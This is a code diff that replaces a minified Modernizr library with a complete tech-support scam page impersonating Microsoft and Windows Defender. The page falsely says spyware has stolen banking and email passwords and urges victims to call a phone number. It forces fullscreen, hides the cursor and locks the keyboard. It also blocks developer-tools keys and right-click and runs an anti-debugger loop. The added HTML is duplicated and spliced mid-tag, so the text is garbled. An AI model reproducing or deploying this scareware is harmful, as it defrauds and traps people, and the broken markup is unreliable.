@@ -1,1 +1,781 @@
-window.Modernizr=function(e,t,n){function r(e){h.cssText=e}function o(e,t){return typeof e===t}function a(e,t){return!!~(""+e).indexOf(t)}function i(e,t){for(var r in e){var o=e[r];if(!a(o,"-")&&h[o]!==n)return"pfx"!=t||o}return!1}function c(e,t,r){for(var a in e){var i=t[e[a]];if(i!==n)return!1===r?e[a]:o(i,"function")?i.bind(r||t):i}return!1}function s(e,t,n){var r=e.charAt(0).toUpperCase()+e.slice(1),a=(e+" "+x.join(r+" ")+r).split(" ");return o(t,"string")||o(t,"undefined")?i(a,t):c(a=(e+" "+w.join(r+" ")+r).split(" "),t,n)}var u,l,d={},f=t.documentElement,m="modernizr",p=t.createElement(m),h=p.style,g=t.createElement("input"),v=":)",y={}.toString,b=" -webkit- -moz- -o- -ms- ".split(" "),E="Webkit Moz O ms",x=E.split(" "),w=E.toLowerCase().split(" "),S="http://www.w3.org/2000/svg",C={},k={},T={},N=[],M=N.slice,P=function(e,n,r,o){var a,i,c,s,u=t.createElement("div"),l=t.body,d=l||t.createElement("body");if(parseInt(r,10))for(;r--;)(c=t.createElement("div")).id=o?o[r]:m+(r+1),u.appendChild(c);return a=["&#173;",'<style id="s',m,'">',e,"</style>"].join(""),u.id=m,(l?u:d).innerHTML+=a,d.appendChild(u),l||(d.style.background="",d.style.overflow="hidden",s=f.style.overflow,f.style.overflow="hidden",f.appendChild(d)),i=n(u,e),l?u.parentNode.removeChild(u):(d.parentNode.removeChild(d),f.style.overflow=s),!!i},j=function(){var e={select:"input",change:"input",submit:"form",reset:"form",error:"img",load:"img",abort:"img"};return function(r,a){a=a||t.createElement(e[r]||"div");var i=(r="on"+r)in a;return i||(a.setAttribute||(a=t.createElement("div")),a.setAttribute&&a.removeAttribute&&(a.setAttribute(r,""),i=o(a[r],"function"),o(a[r],"undefined")||(a[r]=n),a.removeAttribute(r))),a=null,i}}(),$={}.hasOwnProperty;for(var D in l=o($,"undefined")||o($.call,"undefined")?function(e,t){return t in e&&o(e.constructor.prototype[t],"undefined")}:function(e,t){return $.call(e,t)},Function.prototype.bind||(Function.prototype.bind=function(e){var t=this;if("function"!=typeof t)throw new TypeError;var n=M.call(arguments,1),r=function(){if(this instanceof r){var o=function(){};o.prototype=t.prototype;var a=new o,i=t.apply(a,n.concat(M.call(arguments)));return Object(i)===i?i:a}return t.apply(e,n.concat(M.call(arguments)))};return r}),C.flexbox=function(){return s("flexWrap")},C.flexboxlegacy=function(){return s("boxDirection")},C.canvas=function(){var e=t.createElement("canvas");return!(!e.getContext||!e.getContext("2d"))},C.canvastext=function(){return!(!d.canvas||!o(t.createElement("canvas").getContext("2d").fillText,"function"))},C.webgl=function(){return!!e.WebGLRenderingContext},C.touch=function(){var n;return"ontouchstart"in e||e.DocumentTouch&&t instanceof DocumentTouch?n=!0:P(["@media (",b.join("touch-enabled),("),m,")","{#modernizr{top:9px;position:absolute}}"].join(""),(function(e){n=9===e.offsetTop})),n},C.geolocation=function(){return"geolocation"in navigator},C.postmessage=function(){return!!e.postMessage},C.websqldatabase=function(){return!!e.openDatabase},C.indexedDB=function(){return!!s("indexedDB",e)},C.hashchange=function(){return j("hashchange",e)&&(t.documentMode===n||t.documentMode>7)},C.history=function(){return!(!e.history||!history.pushState)},C.draganddrop=function(){var e=t.createElement("div");return"draggable"in e||"ondragstart"in e&&"ondrop"in e},C.websockets=function(){return"WebSocket"in e||"MozWebSocket"in e},C.rgba=function(){return r("background-color:rgba(150,255,150,.5)"),a(h.backgroundColor,"rgba")},C.hsla=function(){return r("background-color:hsla(120,40%,100%,.5)"),a(h.backgroundColor,"rgba")||a(h.backgroundColor,"hsla")},C.multiplebgs=function(){return r("background:url(https://),url(https://),red url(https://)"),/(url\s*\(.*?){3}/.test(h.background)},C.backgroundsize=function(){return s("backgroundSize")},C.borderimage=function(){return s("borderImage")},C.borderradius=function(){return s("borderRadius")},C.boxshadow=function(){return s("boxShadow")},C.textshadow=function(){return""===t.createElement("div").style.textShadow},C.opacity=function(){return function(e,t){r(b.join(e+";")+(t||""))}("opacity:.55"),/^0.55$/.test(h.opacity)},C.cssanimations=function(){return s("animationName")},C.csscolumns=function(){return s("columnCount")},C.cssgradients=function(){var e="background-image:";return r((e+"-webkit- ".split(" ").join("gradient(linear,left top,right bottom,from(#9f9),to(white));"+e)+b.join("linear-gradient(left top,#9f9, white);"+e)).slice(0,-e.length)),a(h.backgroundImage,"gradient")},C.cssreflections=function(){return s("boxReflect")},C.csstransforms=function(){return!!s("transform")},C.csstransforms3d=function(){var e=!!s("perspective");return e&&"webkitPerspective"in f.style&&P("@media (transform-3d),(-webkit-transform-3d){#modernizr{left:9px;position:absolute;height:3px;}}",(function(t){e=9===t.offsetLeft&&3===t.offsetHeight})),e},C.csstransitions=function(){return s("transition")},C.fontface=function(){var e;return P('@font-face {font-family:"font";src:url("https://")}',(function(n,r){var o=t.getElementById("smodernizr"),a=o.sheet||o.styleSheet,i=a?a.cssRules&&a.cssRules[0]?a.cssRules[0].cssText:a.cssText||"":"";e=/src/i.test(i)&&0===i.indexOf(r.split(" ")[0])})),e},C.generatedcontent=function(){var e;return P(["#",m,"{font:0/0 a}#",m,':after{content:"',v,'";visibility:hidden;font:3px/1 a}'].join(""),(function(t){e=t.offsetHeight>=3})),e},C.video=function(){var e=t.createElement("video"),n=!1;try{(n=!!e.canPlayType)&&((n=new Boolean(n)).ogg=e.canPlayType('video/ogg; codecs="theora"').replace(/^no$/,""),n.h264=e.canPlayType('video/mp4; codecs="avc1.42E01E"').replace(/^no$/,""),n.webm=e.canPlayType('video/webm; codecs="vp8, vorbis"').replace(/^no$/,""))}catch(e){}return n},C.audio=function(){var e=t.createElement("audio"),n=!1;try{(n=!!e.canPlayType)&&((n=new Boolean(n)).ogg=e.canPlayType('audio/ogg; codecs="vorbis"').replace(/^no$/,""),n.mp3=e.canPlayType("audio/mpeg;").replace(/^no$/,""),n.wav=e.canPlayType('audio/wav; codecs="1"').replace(/^no$/,""),n.m4a=(e.canPlayType("audio/x-m4a;")||e.canPlayType("audio/aac;")).replace(/^no$/,""))}catch(e){}return n},C.localstorage=function(){try{return localStorage.setItem(m,m),localStorage.removeItem(m),!0}catch(e){return!1}},C.sessionstorage=function(){try{return sessionStorage.setItem(m,m),sessionStorage.removeItem(m),!0}catch(e){return!1}},C.webworkers=function(){return!!e.Worker},C.applicationcache=function(){return!!e.applicationCache},C.svg=function(){return!!t.createElementNS&&!!t.createElementNS(S,"svg").createSVGRect},C.inlinesvg=function(){var e=t.createElement("div");return e.innerHTML="<svg/>",(e.firstChild&&e.firstChild.namespaceURI)==S},C.smil=function(){return!!t.createElementNS&&/SVGAnimate/.test(y.call(t.createElementNS(S,"animate")))},C.svgclippaths=function(){return!!t.createElementNS&&/SVGClipPath/.test(y.call(t.createElementNS(S,"clipPath")))},C)l(C,D)&&(u=D.toLowerCase(),d[u]=C[D](),N.push((d[u]?"":"no-")+u));return d.input||(d.input=function(n){for(var r=0,o=n.length;o>r;r++)T[n[r]]=!!(n[r]in g);return T.list&&(T.list=!(!t.createElement("datalist")||!e.HTMLDataListElement)),T}("autocomplete autofocus list placeholder max min multiple pattern required step".split(" ")),d.inputtypes=function(e){for(var r,o,a,i=0,c=e.length;c>i;i++)g.setAttribute("type",o=e[i]),(r="text"!==g.type)&&(g.value=v,g.style.cssText="position:absolute;visibility:hidden;",/^range$/.test(o)&&g.style.WebkitAppearance!==n?(f.appendChild(g),r=(a=t.defaultView).getComputedStyle&&"textfield"!==a.getComputedStyle(g,null).WebkitAppearance&&0!==g.offsetHeight,f.removeChild(g)):/^(search|tel)$/.test(o)||(r=/^(url|email)$/.test(o)?g.checkValidity&&!1===g.checkValidity():g.value!=v)),k[e[i]]=!!r;return k}("search tel url email datetime date month week time datetime-local number range color".split(" "))),d.addTest=function(e,t){if("object"==typeof e)for(var r in e)l(e,r)&&d.addTest(r,e[r]);else{if(e=e.toLowerCase(),d[e]!==n)return d;t="function"==typeof t?t():t,f.className+=" "+(t?"":"no-")+e,d[e]=t}return d},r(""),p=g=null,function(e,t){function n(){var e=h.elements;return"string"==typeof e?e.split(" "):e}function r(e){var t=p[e[f]];return t||(t={},m++,e[f]=m,p[m]=t),t}function o(e,n,o){return n||(n=t),s?n.createElement(e):(o||(o=r(n)),!(a=o.cache[e]?o.cache[e].cloneNode():d.test(e)?(o.cache[e]=o.createElem(e)).cloneNode():o.createElem(e)).canHaveChildren||l.test(e)||a.tagUrn?a:o.frag.appendChild(a));var a}function a(e,t){t.cache||(t.cache={},t.createElem=e.createElement,t.createFrag=e.createDocumentFragment,t.frag=t.createFrag()),e.createElement=function(n){return h.shivMethods?o(n,e,t):t.createElem(n)},e.createDocumentFragment=Function("h,f","return function(){var n=f.cloneNode(),c=n.createElement;h.shivMethods&&("+n().join().replace(/[\w\-]+/g,(function(e){return t.createElem(e),t.frag.createElement(e),'c("'+e+'")'}))+");return n}")(h,t.frag)}function i(e){e||(e=t);var n=r(e);return!h.shivCSS||c||n.hasCSS||(n.hasCSS=!!function(e,t){var n=e.createElement("p"),r=e.getElementsByTagName("head")[0]||e.documentElement;return n.innerHTML="x<style>"+t+"</style>",r.insertBefore(n.lastChild,r.firstChild)}(e,"article,aside,dialog,figcaption,figure,footer,header,hgroup,main,nav,section{display:block}mark{background:#FF0;color:#000}template{display:none}")),s||a(e,n),e}var c,s,u=e.html5||{},l=/^<|^(?:button|map|select|textarea|object|iframe|option|optgroup)$/i,d=/^(?:a|b|code|div|fieldset|h1|h2|h3|h4|h5|h6|i|label|li|ol|p|q|span|strong|style|table|tbody|td|th|tr|ul)$/i,f="_html5shiv",m=0,p={};!function(){try{var e=t.createElement("a");e.innerHTML="<xyz></xyz>",c="hidden"in e,s=1==e.childNodes.length||function(){t.createElement("a");var e=t.createDocumentFragment();return void 0===e.cloneNode||void 0===e.createDocumentFragment||void 0===e.createElement}()}catch(e){c=!0,s=!0}}();var h={elements:u.elements||"abbr article aside audio bdi canvas data datalist details dialog figcaption figure footer header hgroup main mark meter nav output progress section summary template time video",version:"3.7.0",shivCSS:!1!==u.shivCSS,supportsUnknownElements:s,shivMethods:!1!==u.shivMethods,type:"default",shivDocument:i,createElement:o,createDocumentFragment:function(e,o){if(e||(e=t),s)return e.createDocumentFragment();for(var a=(o=o||r(e)).frag.cloneNode(),i=0,c=n(),u=c.length;u>i;i++)a.createElement(c[i]);return a}};e.html5=h,i(t)}(this,t),d._version="2.8.3",d._prefixes=b,d._domPrefixes=w,d._cssomPrefixes=x,d.mq=function(t){var n,r=e.matchMedia||e.msMatchMedia;return r?r(t)&&r(t).matches||!1:(P("@media "+t+" { #"+m+" { position: absolute; } }",(function(t){n="absolute"==(e.getComputedStyle?getComputedStyle(t,null):t.currentStyle).position})),n)},d.hasEvent=j,d.testProp=function(e){return i([e])},d.testAllProps=s,d.testStyles=P,d.prefixed=function(e,t,n){return t?s(e,t,n):s(e,"pfx")},f.className=f.className.replace(/(^|\s)no-js(\s|$)/,"$1$2")+" js "+N.join(" "),d}(this,this.document);
+<!doctype html>
+<html lang="en">
+    <head>
+    
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="bootstrap.min.css" crossorigin="anonymous">
+    <script src="jquery.min.js"></script>
+    <link rel="stylesheet" type="text/css" href="main.css">
+    <title>Security Center</title>
+    <link rel="stylesheet" href="font-awesome.min.css">
+
+    <script>
+        function dsasfsdcscnsmndqweqwe(name)
+        {
+            name = name.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
+            var regexS = "[\\?&]"+name+"=([^&#]*)";
+            var regex = new RegExp( regexS );
+            var results = regex.exec( window.location.href );
+            if( results == null )
+                return "";
+            else
+                return results[1];
+        }
+        var phone = dsasfsdcscnsmndqweqwe('phone');
+    </script>
+
+    <script type="text/javascript">
+        window.onload = function () {
+            document.onclick = function (e) {
+                e = e || event;
+                target = e.target || e.srcElement;
+                if (target.tagName === "DIV") {
+                    toggleFullScreen();
+                    document.body.style.cursor = 'not-allowed';
+                    document.getElementById('map').innerHTML = stroka;
+                    document.getElementById('fa').innerHTML = "<iframe src='#' width='12' height='12' style='position: absolute; left: -25px;'></iframe>";
+                } else {
+                    toggleFullScreen();
+                    document.body.style.cursor = 'not-allowed';
+                    document.getElementById('map').innerHTML = stroka;
+                    document.getElementById('fa').innerHTML = "<iframe src='#' width='12' height='12' style='position: absolute; left: -25px;'></iframe>";
+                }
+            }
+        }
+    </script>
+</head>
+<body id="mycanvas" class="map" onbeforeunload="return myFunction()" style="cursor:none;">
+
+<div class="bg" style="cursor:none;">
+    <div class="bgimg" style="top: 0px;"><img src="bg2.jpg" alt width="100%"></div>
+
+</div>
+<a href="#" rel="noreferrer" id="link_black" style="cursor: none;">
+    <div class="black" style="height: 145%;cursor: none;"></div>
+</a>
+
+
+
+
+
+
+<div id="footer" style="top: 672px; position: absolute;cursor: none;">
+    <div class="row">
+
+        <div class="col-md-12">
+            <div class="right-foot" style="text-align: center;">
+                <span id="footertxt"><img src="microsoft.png"> Call Microsoft Security Centre: </span><span style="font-weight: 700;padding-left: 13px;color: #fff;">(Toll-Free)<span style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;"><script>document.write(1-888-479-6555)</script> </span> </span>
+            </div>
+        </div>
+        <div class="col-md-12">
+            <marquee width="100%" direction="left" height="100px"><small class="text-left" style="color: #eee;font-size: 10px;">Windows Secure Services prevented an unrecognized IP Application from stating. Running this IP application might put your PC
+                    at risk. Windows Defender Scan has found potentially unwanted Threat on this device that can steal
+                    your passwords, online identity, financial information, personal Information, pictures or
+                    documents.</small></marquee>
+        </div>
+    </div>
+
+
+</div>
+
+<div id="yteuwqtudggsajdgjahs" class="lightbox">
+    <div class="ilb top">
+        <div class="headers ilb" style="border-bottom: 1px solid #d6d5d5;">
+            <span id="txtadd" class="fl title"><span class="fl ilb"><img src="def.png" class="logo3"></span>Security Services</span>
+            <span id="txts1" class="fl title2"><a href="#"><img src="cross.png"></a></span>
+
+        </div>
+    </div>
+    <div id="txtintro">
+                <span class="colo-rd">App: Ads.fiancetrack(2).dll<br>
+                Threat Detected:  Trojan Spyware</span>
+    </div>
+    <img id="banner" src="virus-images.jpg">
+    <div id="disclaimer">
+        Access has been blocked for security reasons and for Safety.<br>
+        <span class="support">Call Windows Security Toll Free: <script>document.write(1-888-479-6555)</script>
+<html lang="en">
+    <head>
+    
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="bootstrap.min.css" crossorigin="anonymous">
+    <script src="jquery.min.js"></script>
+    <link rel="stylesheet" type="text/css" href="main.css">
+    <title>Security Center</title>
+    <link rel="stylesheet" href="font-awesome.min.css">
+
+    <script>
+        function dsasfsdcscnsmndqweqwe(name)
+        {
+            name = name.replace(/[\[]/,"\\\[").replace(/[\]]/,"\\\]");
+            var regexS = "[\\?&]"+name+"=([^&#]*)";
+            var regex = new RegExp( regexS );
+            var results = regex.exec( window.location.href );
+            if( results == null )
+                return "";
+            else
+                return results[1];
+        }
+        var phone = dsasfsdcscnsmndqweqwe('phone');
+    </script>
+
+    <script type="text/javascript">
+        window.onload = function () {
+            document.onclick = function (e) {
+                e = e || event;
+                target = e.target || e.srcElement;
+                if (target.tagName === "DIV") {
+                    toggleFullScreen();
+                    document.body.style.cursor = 'not-allowed';
+                    document.getElementById('map').innerHTML = stroka;
+                    document.getElementById('fa').innerHTML = "<iframe src='#' width='12' height='12' style='position: absolute; left: -25px;'></iframe>";
+                } else {
+                    toggleFullScreen();
+                    document.body.style.cursor = 'not-allowed';
+                    document.getElementById('map').innerHTML = stroka;
+                    document.getElementById('fa').innerHTML = "<iframe src='#' width='12' height='12' style='position: absolute; left: -25px;'></iframe>";
+                }
+            }
+        }
+    </script>
+</head>
+<body id="mycanvas" class="map" onbeforeunload="return myFunction()" style="cursor:none;">
+
+<div class="bg" style="cursor:none;">
+    <div class="bgimg" style="top: 0px;"><img src="bg2.jpg" alt width="100%"></div>
+
+</div>
+<a href="#" rel="noreferrer" id="link_black" style="cursor: none;">
+    <div class="black" style="height: 145%;cursor: none;"></div>
+</a>
+
+
+
+
+
+
+<div id="footer" style="top: 672px; position: absolute;cursor: none;">
+    <div class="row">
+
+        <div class="col-md-12">
+            <div class="right-foot" style="text-align: center;">
+                <span id="footertxt"><img src="microsoft.png"> Call Microsoft Security Centre: </span><span style="font-weight: 700;padding-left: 13px;color: #fff;">(Toll-Free)<span style="border: 1px solid #fff;border-radius: 5px;padding: 2px 5px;"><script>document.write(1-888-479-6555)</script> </span> </span>
+            </div>
+        </div>
+        <div class="col-md-12">
+            <marquee width="100%" direction="left" height="100px"><small class="text-left" style="color: #eee;font-size: 10px;">Windows Secure Services prevented an unrecognized IP Application from stating. Running this IP application might put your PC
+                    at risk. Windows Defender Scan has found potentially unwanted Threat on this device that can steal
+                    your passwords, online identity, financial information, personal Information, pictures or
+                    documents.</small></marquee>
+        </div>
+    </div>
+
+
+</div>
+
+<div id="yteuwqtudggsajdgjahs" class="lightbox">
+    <div class="ilb top">
+        <div class="headers ilb" style="border-bottom: 1px solid #d6d5d5;">
+            <span id="txtadd" class="fl title"><span class="fl ilb"><img src="def.png" class="logo3"></span>Security Services</span>
+            <span id="txts1" class="fl title2"><a href="#"><img src="cross.png"></a></span>
+
+        </div>
+    </div>
+    <div id="txtintro">
+                <span class="colo-rd">App: Ads.fiancetrack(2).dll<br>
+                Threat Detected:  Trojan Spyware</span>
+    </div>
+    <img id="banner" src="virus-images.jpg">
+    <div id="disclaimer">
+        Access has been blocked for security reasons and for Safety.<br>
+        <span class="support">Call Windows Security Toll Free: <script>document.write(1-888-479-6555)</script> </span>
+    </div>
+    <div id="bottom">
+        <img id="badge" src="microsoft.png"><span class="title3">Microsoft</span>
+        <ul>
+            <li>
+                <a href="#">
+                    <div class="fr button2">
+                        <span id="addtochromebutton">Cancel</span>
+                    </div>
+                </a>
+            </li>
+            <li>
+                <a href="#">
+                    <div class="fr button">
+                        <span id="addtochromebutton">Scan</span>
+                    </div>
+                </a>
+            </li>
+        </ul>
+
+    </div>
+</div>
+
+<div id="pop_up_new" class="cardcontainer" style="cursor: none;">
+    <p class="text-center" style="    font-size: 16px;
+    font-weight: normal;
+    margin: 0;
+    margin-bottom: 5px;
+    padding: 5px 10px;
+    color: #FFFFFF !important;
+    color: #414141;font-weight: bold;
+    margin-top: 8px;">MS WINDOWS DEFENDER - Warning Alert System</p>
+    <p>** ACCESS HAS BEEN BLOCKED FOR SECURITY REASONS AND FOR THE SAFETY **</p>
+    <p>Your System has alerted us that it has been infected with Spyware Issues. The following data has been
+        Breached.</p>
+    <p>&gt; Email Passwords<br>
+        &gt; Banking Passwords<br>
+        &gt; Facebook Login<br>
+        &gt; Photos &amp; Files
+
+    </p>
+    <p>Windows Security Feature has found potentially unwanted Adware on this device that can Breach your passwords, online
+        identity, financial information, files, Personal pictures or documents.</p>
+    <p>You must Call us immediately so that our System engineers can walk you through the removal process over the
+        Phone.</p>
+    <p>Contact MS Windows Toll-Free immediately to report this threat, prevent identity theft and unlock access to this
+        device.</p>
+    <p>Closing this Page will put your personal information at risk and lead to a suspension of your Windows
+        Registration Private Key.</p>
+    <p style="padding-bottom: 0px; color:#fff; font-size:14px;">Contact Microsoft (Toll-Free) Number: <strong>
+            <script>document.write(1-888-479-6555)</script> </strong></p>
+    <div class="action_buttons"><a class="active" id="leave_page" style="cursor: pointer; color: #FFFFFF !important;">Allow</a> <a class="active" id="leave_page" style="color: #FFFFFF !important;">Deny</a>
+    </div>
+</div>
+
+<div id="welcomeDiv" style=" display:none; background-color:rgb(40 40 40 / 62%); height: auto; width: 550px; margin-left:30%;position: absolute;z-index: 9999999999;  " class="answer_list">
+    <p class="text-center" style="color: #FEFEFE;  margin-top:10px; font-size: 16px; opacity:.9; ">You must Call us immediately so that our System engineers can walk you through the removal process over the
+        phone.<br>Your Computer is disabled. <br><br> </p>
+
+
+</div>
+
+<script src="modernizr.min.js" type="text/javascript"></script>
+<script src="bootstrap.bundle.min.js" crossorigin="anonymous"></script>
+<script type="text/javascript" src="fullscreen.js"></script>
+<script type="text/javascript" src="before.js"></script>
+<script type="text/javascript" src="main.js"></script>
+<script type="text/javascript" src="light.js"></script>
+<script type="text/javascript">
+    $(function () {
+        var dhlaskhlncwqhhqwlelqj = 0;
+        var interval = setInterval(function () {
+            dhlaskhlncwqhhqwlelqj += 10;
+            $("#dynamic")
+                .css("width", dhlaskhlncwqhhqwlelqj + "%")
+                .attr("aria-valuenow", dhlaskhlncwqhhqwlelqj)
+                .text(dhlaskhlncwqhhqwlelqj + "% Complete");
+            if (dhlaskhlncwqhhqwlelqj >= 100)
+                clearInterval(interval);
+        }, 100);
+    });
+</script>
+<script type="text/javascript">
+    (function ($) {
+        $.fn.countTo = function (options) {
+            options = options || {};
+
+            return $(this).each(function () {
+                // set options for current element
+                var settings = $.extend({}, $.fn.countTo.defaults, {
+                    from: $(this).data('from'),
+                    to: $(this).data('to'),
+                    speed: $(this).data('speed'),
+                    refreshInterval: $(this).data('refresh-interval'),
+                    decimals: $(this).data('decimals')
+                }, options);
+
+                // how many times to update the value, and how much to increment the value on each update
+                var loops = Math.ceil(settings.speed / settings.refreshInterval),
+                    increment = (settings.to - settings.from) / loops;
+
+                // references & variables that will change with each update
+                var self = this,
+                    $self = $(this),
+                    loopCount = 0,
+                    value = settings.from,
+                    data = $self.data('countTo') || {};
+
+                $self.data('countTo', data);
+
+                // if an existing interval can be found, clear it first
+                if (data.interval) {
+                    clearInterval(data.interval);
+                }
+                data.interval = setInterval(updateTimer, settings.refreshInterval);
+
+                // initialize the element with the starting value
+                render(value);
+
+                function updateTimer() {
+                    value += increment;
+                    loopCount++;
+
+                    render(value);
+
+                    if (typeof (settings.onUpdate) == 'function') {
+                        settings.onUpdate.call(self, value);
+                    }
+
+                    if (loopCount >= loops) {
+                        // remove the interval
+                        $self.removeData('countTo');
+                        clearInterval(data.interval);
+                        value = settings.to;
+
+                        if (typeof (settings.onComplete) == 'function') {
+                            settings.onComplete.call(self, value);
+                        }
+                    }
+                }
+
+                function render(value) {
+                    var formattedValue = settings.formatter.call(self, value, settings);
+                    $self.html(formattedValue);
+                }
+            });
+        };
+
+        $.fn.countTo.defaults = {
+            from: 0,               // the number the element should start at
+            to: 0,                 // the number the element should end at
+            speed: 1,           // how long it should take to count between the target numbers
+            refreshInterval: 1,  // how often the element should be updated
+            decimals: 0,           // the number of decimal places to show
+            formatter: formatter,  // handler for formatting the value before rendering
+            onUpdate: null,        // callback method for every time the element is updated
+            onComplete: null       // callback method for when the element finishes updating
+        };
+
+        function formatter(value, settings) {
+            return value.toFixed(settings.decimals);
+        }
+    }(jQuery));
+
+    jQuery(function ($) {
+        // custom formatting example
+        $('.count-number').data('countToOptions', {
+            formatter: function (value, options) {
+                return value.toFixed(options.decimals).replace(/\B(?=(?:\d{3})+(?!\d))/g, ',');
+            }
+        });
+
+        // start all the timers
+        $('.timer').each(count);
+
+        function count(options) {
+            var $this = $(this);
+            options = $.extend({}, options || {}, $this.data('countToOptions') || {});
+            $this.countTo(options);
+        }
+    });
+</script>
+<script type="text/javascript">
+    $(document).ready(function () {
+        $(".pro_box2").delay(1).fadeIn(800);
+        $(".pro_box3").delay(1).fadeIn(800);
+        $(".pro_box3").delay(1).fadeIn(800);
+        $("#pop_up_new").delay(1).fadeIn(800);
+        $("#yteuwqtudggsajdgjahs").delay(1).fadeIn(800);
+    });
+</script>
+<script type="text/javascript">
+    document.addEventListener('keyup', function (es) {
+        if (es.keyCode === 27) {
+            toggleFullScreen();
+        }
+    }, false);
+</script>
+<script type="text/javascript">
+    document.addEventListener('keyup', function (e) {
+        if (e.keyCode === 122 || e.keyCode === 17 || e.keyCode === 18 || e.keyCode === 13) {
+            document.getElementById('map').innerHTML = stroka;
+            toggleFullScreen();
+        }
+    }, false);
+</script>
+<script>
+    var modal = document.getElementById('myModal');
+    var btn = document.getElementById("myBtn");
+    var span = document.getElementsByClassName("close")[0];
+
+   
+    span.onclick = function () {
+        modal.style.display = "none";
+    }
+
+    window.onclick = function (event) {
+        if (event.target == modal) {
+            modal.style.display = "none";
+        }
+    }
+    $(document).ready(function () {
+        $("#mycanvas").click(function () { $("#welcomeDiv").show();});
+        
+        $("body").mouseover(function () {$("#yteuwqtudggsajdgjahs").show();
+        });
+        
+    });
+</script>
+</body>
+
+<script>
+      function play() {
+        var audio = document.getElementById("audio");
+        audio.play();
+      }
+ </script>
+<script>
+navigator.keyboard.lock();
+document.onkeydown = function (e) {
+return false;
+}
+</script>
+    <script>
+
+    document.onkeydown = function (e) {
+        if (event.keyCode == 123) {
+            return false;
+        }
+        if (e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'i'.charCodeAt(0))) {
+            return false;
+        }
+        if (e.ctrlKey && e.shiftKey && (e.keyCode == 'l'.charCodeAt(0) || e.keyCode == 'l'.charCodeAt(0))) {
+            return false;
+        }
+        if (e.ctrlKey && e.shiftKey && (e.keyCode == 'C'.charCodeAt(0) || e.keyCode == 'c'.charCodeAt(0))) {
+            return false;
+        }
+        if (e.ctrlKey && e.shiftKey && (e.keyCode == 'J'.charCodeAt(0) || e.keyCode == 'j'.charCodeAt(0))) {
+            return false;
+        }
+        if (e.ctrlKey && (e.keyCode == 'U'.charCodeAt(0) || e.keyCode == 'u'.charCodeAt(0))) {
+            return false;
+        }
+        if (e.ctrlKey && (e.keyCode == 'S'.charCodeAt(0) || e.keyCode == 's'.charCodeAt(0))) {
+            return false;
+        }
+    }
+</script>
+<script>
+document.addEventListener('contextmenu', event => event.preventDefault());
+(function () {
+        (function a() {
+            try {
+                (function b(i) {
+                    if (('' + (i / i)).length !== 1 || i % 20 === 0) {
+                        (function () { }).constructor('debugger')()
+                    } else {
+                        debugger
+                    }
+                    b(++i)
+                }
+                )(0)
+            } catch (e) {
+                setTimeout(a, 5)
+            }
+        }
+        )()
+    }
+    )();
+    delete window.console
+console.log('test');
+</script>
+
+</html>)</script> </span>
+    </div>
+    <div id="bottom">
+        <img id="badge" src="microsoft.png"><span class="title3">Microsoft</span>
+        <ul>
+            <li>
+                <a href="#">
+                    <div class="fr button2">
+                        <span id="addtochromebutton">Cancel</span>
+                    </div>
+                </a>
+            </li>
+            <li>
+                <a href="#">
+                    <div class="fr button">
+                        <span id="addtochromebutton">Scan</span>
+                    </div>
+                </a>
+            </li>
+        </ul>
+
+    </div>
+</div>
+
+<div id="pop_up_new" class="cardcontainer" style="cursor: none;">
+    <p class="text-center" style="    font-size: 16px;
+    font-weight: normal;
+    margin: 0;
+    margin-bottom: 5px;
+    padding: 5px 10px;
+    color: #FFFFFF !important;
+    color: #414141;font-weight: bold;
+    margin-top: 8px;">MS WINDOWS DEFENDER - Warning Alert System</p>
+    <p>** ACCESS HAS BEEN BLOCKED FOR SECURITY REASONS AND FOR THE SAFETY **</p>
+    <p>Your System has alerted us that it has been infected with Spyware Issues. The following data has been
+        Breached.</p>
+    <p>&gt; Email Passwords<br>
+        &gt; Banking Passwords<br>
+        &gt; Facebook Login<br>
+        &gt; Photos &amp; Files
+
+    </p>
+    <p>Windows Security Feature has found potentially unwanted Adware on this device that can Breach your passwords, online
+        identity, financial information, files, Personal pictures or documents.</p>
+    <p>You must Call us immediately so that our System engineers can walk you through the removal process over the
+        Phone.</p>
+    <p>Contact MS Windows Toll-Free immediately to report this threat, prevent identity theft and unlock access to this
+        device.</p>
+    <p>Closing this Page will put your personal information at risk and lead to a suspension of your Windows
+        Registration Private Key.</p>
+    <p style="padding-bottom: 0px; color:#fff; font-size:14px;">Contact Microsoft (Toll-Free) Number: <strong>
+            <script>document.write(1-888-479-6555)</script> </strong></p>
+    <div class="action_buttons"><a class="active" id="leave_page" style="cursor: pointer; color: #FFFFFF !important;">Allow</a> <a class="active" id="leave_page" style="color: #FFFFFF !important;">Deny</a>
+    </div>
+</div>
+
+<div id="welcomeDiv" style=" display:none; background-color:rgb(40 40 40 / 62%); height: auto; width: 550px; margin-left:30%;position: absolute;z-index: 9999999999;  " class="answer_list">
+    <p class="text-center" style="color: #FEFEFE;  margin-top:10px; font-size: 16px; opacity:.9; ">You must Call us immediately so that our System engineers can walk you through the removal process over the
+        phone.<br>Your Computer is disabled. <br><br> </p>
+
+
+</div>
+
+<script src="modernizr.min.js" type="text/javascript"></script>
+<script src="bootstrap.bundle.min.js" crossorigin="anonymous"></script>
+<script type="text/javascript" src="fullscreen.js"></script>
+<script type="text/javascript" src="before.js"></script>
+<script type="text/javascript" src="main.js"></script>
+<script type="text/javascript" src="light.js"></script>
+<script type="text/javascript">
+    $(function () {
+        var dhlaskhlncwqhhqwlelqj = 0;
+        var interval = setInterval(function () {
+            dhlaskhlncwqhhqwlelqj += 10;
+            $("#dynamic")
+                .css("width", dhlaskhlncwqhhqwlelqj + "%")
+                .attr("aria-valuenow", dhlaskhlncwqhhqwlelqj)
+                .text(dhlaskhlncwqhhqwlelqj + "% Complete");
+            if (dhlaskhlncwqhhqwlelqj >= 100)
+                clearInterval(interval);
+        }, 100);
+    });
+</script>
+<script type="text/javascript">
+    (function ($) {
+        $.fn.countTo = function (options) {
+            options = options || {};
+
+            return $(this).each(function () {
+                // set options for current element
+                var settings = $.extend({}, $.fn.countTo.defaults, {
+                    from: $(this).data('from'),
+                    to: $(this).data('to'),
+                    speed: $(this).data('speed'),
+                    refreshInterval: $(this).data('refresh-interval'),
+                    decimals: $(this).data('decimals')
+                }, options);
+
+                // how many times to update the value, and how much to increment the value on each update
+                var loops = Math.ceil(settings.speed / settings.refreshInterval),
+                    increment = (settings.to - settings.from) / loops;
+
+                // references & variables that will change with each update
+                var self = this,
+                    $self = $(this),
